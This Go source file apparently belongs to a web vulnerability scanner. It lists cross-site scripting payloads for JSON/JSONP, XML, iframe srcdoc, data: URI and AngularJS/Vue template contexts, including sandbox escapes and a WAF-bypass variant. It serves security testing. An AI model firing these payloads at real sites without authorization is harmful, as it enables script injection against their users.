package payloads

import (
	"github.com/pyneda/sukyan/pkg/scan/reflection"
)

// GetJSONContextPayloads returns payloads for JSON response contexts
// JSON responses can be exploited via:
// - JSONP callback injection
// - Content-Type sniffing (older browsers)
// - Reflection in JSON values that are later rendered in DOM
// - JSON response with text/html Content-Type
func GetJSONContextPayloads(analysis *reflection.ReflectionAnalysis) []XSSPayload {
	payloads := []XSSPayload{
		// JSON breaking - close JSON and inject script
		{
			Value:         `"}</script><script>alert(1)</script>`,
			Categories:    []XSSPayloadCategory{CategoryJSBreaking, CategoryTagInjection},
			RequiredChars: []string{"\"", "}", "<", ">"},
			Confidence:    75,
		},
		{
			Value:         `"}];alert(1);//`,
			Categories:    []XSSPayloadCategory{CategoryJSBreaking},
			RequiredChars: []string{"\"", "}", "]", ";", "/"},
			Confidence:    70,
		},
		{
			Value:         `"};alert(1);//`,
			Categories:    []XSSPayloadCategory{CategoryJSBreaking},
			RequiredChars: []string{"\"", "}", ";", "/"},
			Confidence:    70,
		},

		// For when JSON is assigned to variable and later innerHTML'd
		{
			Value:         `<img src=x onerror=alert(1)>`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler},
			EventType:     "onerror",
			RequiredChars: []string{"<", ">", "="},
			Confidence:    60,
		},

		// JSON key injection (when reflected in key position)
		{
			Value:         `"__proto__":{"test":1},"x":"`,
			Categories:    []XSSPayloadCategory{CategoryJSBreaking},
			RequiredChars: []string{"\"", ":", "{", "}"},
			Confidence:    50,
		},

		// JSONP callback breaking
		{
			Value:         `");alert(1);//`,
			Categories:    []XSSPayloadCategory{CategoryJSBreaking},
			RequiredChars: []string{"\"", ")", ";", "/"},
			Confidence:    75,
		},
		{
			Value:         `');alert(1);//`,
			Categories:    []XSSPayloadCategory{CategoryJSBreaking},
			RequiredChars: []string{"'", ")", ";", "/"},
			Confidence:    75,
		},

		// Array context breaking
		{
			Value:         `"],alert(1),["`,
			Categories:    []XSSPayloadCategory{CategoryJSBreaking},
			RequiredChars: []string{"\"", "]", ",", "["},
			Confidence:    65,
		},
	}

	// Add confirm/prompt variations
	confirmPayloads := []XSSPayload{
		{
			Value:         `"}];confirm(1);//`,
			Categories:    []XSSPayloadCategory{CategoryJSBreaking},
			RequiredChars: []string{"\"", "}", "]", ";", "/"},
			Confidence:    70,
		},
		{
			Value:         `");confirm(1);//`,
			Categories:    []XSSPayloadCategory{CategoryJSBreaking},
			RequiredChars: []string{"\"", ")", ";", "/"},
			Confidence:    75,
		},
	}
	payloads = append(payloads, confirmPayloads...)

	return payloads
}

// GetXMLContextPayloads returns payloads for XML/XHTML contexts
func GetXMLContextPayloads() []XSSPayload {
	return []XSSPayload{
		// CDATA section breaking
		{
			Value:         `]]><script>alert(1)</script>`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection},
			RequiredChars: []string{"]", ">", "<"},
			Confidence:    75,
		},
		{
			Value:         `]]><img src=x onerror=alert(1)>`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler},
			EventType:     "onerror",
			RequiredChars: []string{"]", ">", "<", "="},
			Confidence:    75,
		},

		// CDATA injection for content execution
		{
			Value:         `<![CDATA[<script>alert(1)</script>]]>`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection},
			RequiredChars: []string{"<", ">", "[", "]"},
			Confidence:    65,
		},

		// XML comment breaking
		{
			Value:         `--><script>alert(1)</script><!--`,
			Categories:    []XSSPayloadCategory{CategoryCommentBreaking, CategoryTagInjection},
			RequiredChars: []string{"-", ">", "<"},
			Confidence:    70,
		},

		// Processing instruction injection
		{
			Value:         `?><script>alert(1)</script><?xml `,
			Categories:    []XSSPayloadCategory{CategoryTagInjection},
			RequiredChars: []string{"?", ">", "<"},
			Confidence:    60,
		},

		// SVG/MathML in XML context
		{
			Value:         `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler},
			EventType:     "onload",
			RequiredChars: []string{"<", ">", "=", "\""},
			Confidence:    70,
		},

		// XML entity injection (if entities are processed)
		{
			Value:         `&lt;script&gt;alert(1)&lt;/script&gt;`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection},
			RequiredChars: []string{"&", ";"},
			Confidence:    50, // Lower confidence - depends on entity processing
		},
	}
}

// GetSrcdocContextPayloads returns payloads for iframe srcdoc attribute
// srcdoc content is HTML-decoded before being rendered
func GetSrcdocContextPayloads() []XSSPayload {
	return []XSSPayload{
		// HTML entities are decoded in srcdoc
		{
			Value:         `&lt;script&gt;alert(1)&lt;/script&gt;`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection},
			RequiredChars: []string{"&", ";"},
			Confidence:    80,
		},
		{
			Value:         `&lt;img src=x onerror=alert(1)&gt;`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection, CategoryEventHandler},
			EventType:     "onerror",
			RequiredChars: []string{"&", ";", "="},
			Confidence:    80,
		},

		// Numeric HTML entities
		{
			Value:         `&#60;script&#62;alert(1)&#60;/script&#62;`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection},
			RequiredChars: []string{"&", "#", ";"},
			Confidence:    80,
		},
		{
			Value:         `&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;`,
			Categories:    []XSSPayloadCategory{CategoryTagInjection},
			RequiredChars: []string{"&", "#", "x", ";"},
			Confidence:    80,
		},
	}
}

// GetDataURIContextPayloads returns payloads for data: URI contexts
func GetDataURIContextPayloads() []XSSPayload {
	return []XSSPayload{
		// Basic data URI XSS
		{
			Value:         `data:text/html,<script>alert(1)</script>`,
			Categories:    []XSSPayloadCategory{CategoryURLScheme, CategoryTagInjection},
			RequiredChars: []string{":", "<", ">"},
			Confidence:    70,
		},
		{
			Value:         `data:text/html,<img src=x onerror=alert(1)>`,
			Categories:    []XSSPayloadCategory{CategoryURLScheme, CategoryTagInjection, CategoryEventHandler},
			EventType:     "onerror",
			RequiredChars: []string{":", "<", ">", "="},
			Confidence:    70,
		},

		// Base64 encoded data URI
		{
			Value:         `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
			Categories:    []XSSPayloadCategory{CategoryURLScheme},
			RequiredChars: []string{":", ";", ",", "="},
			Confidence:    65,
		},

		// With confirm/prompt for WAF bypass
		{
			Value:         `data:text/html,<script>confirm(1)</script>`,
			Categories:    []XSSPayloadCategory{CategoryURLScheme, CategoryTagInjection},
			RequiredChars: []string{":", "<", ">"},
			Confidence:    70,
		},
		{
			Value:         `data:text/html,<script>prompt(1)</script>`,
			Categories:    []XSSPayloadCategory{CategoryURLScheme, CategoryTagInjection},
			RequiredChars: []string{":", "<", ">"},
			Confidence:    70,
		},
	}
}

// GetTemplateContextPayloads returns payloads for client-side template injection
// (AngularJS, Vue.js, etc.)
func GetTemplateContextPayloads() []XSSPayload {
	return []XSSPayload{
		// AngularJS sandbox escapes
		{
			Value:         `{{constructor.constructor('alert(1)')()}}`,
			Categories:    []XSSPayloadCategory{CategoryPolyglot},
			RequiredChars: []string{"{", "}", "(", ")", "'"},
			Confidence:    60,
		},
		{
			Value:         `{{$on.constructor('alert(1)')()}}`,
			Categories:    []XSSPayloadCategory{CategoryPolyglot},
			RequiredChars: []string{"{", "}", "$", "(", ")", "'"},
			Confidence:    60,
		},

		// Vue.js
		{
			Value:         `{{_c.constructor('alert(1)')()}}`,
			Categories:    []XSSPayloadCategory{CategoryPolyglot},
			RequiredChars: []string{"{", "}", "_", "(", ")", "'"},
			Confidence:    55,
		},

		// Generic template injection probes
		{
			Value:         `${{<%[%'"}}%\`,
			Categories:    []XSSPayloadCategory{CategoryPolyglot},
			RequiredChars: []string{"$", "{", "%", "'", "\"", "\\"},
			Confidence:    40, // Probe, not execution
		},
	}
}
